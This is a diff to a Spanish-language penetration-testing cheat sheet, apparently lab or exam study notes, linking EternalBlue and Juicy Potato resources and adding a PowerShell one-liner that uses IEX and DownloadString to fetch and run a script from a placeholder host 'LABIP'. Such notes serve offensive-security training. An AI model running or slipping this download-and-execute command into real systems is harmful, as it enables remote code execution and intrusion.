@@ -41,6 +41,10 @@ Utiliza la opción --static sabiamente https://stackoverflow.com/questions/86921
 **MS17-010** Si te enfrentas a EternalBlue :) https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/  
 **Juicy Potato** Si cuentas con un usuario y al hacer "whoami /priv" cuenta con privilegios SeImpersonate o SeAssignPrimaryToken... https://github.com/ohpe/juicy-potato
 
+##Powershell invoke script
+
+powershell "IEX(New-Object Net.webClient).downloadString('http://LABIP/file.ipp')"
+
 ## Exploit search
 
     searchsploit <service name>
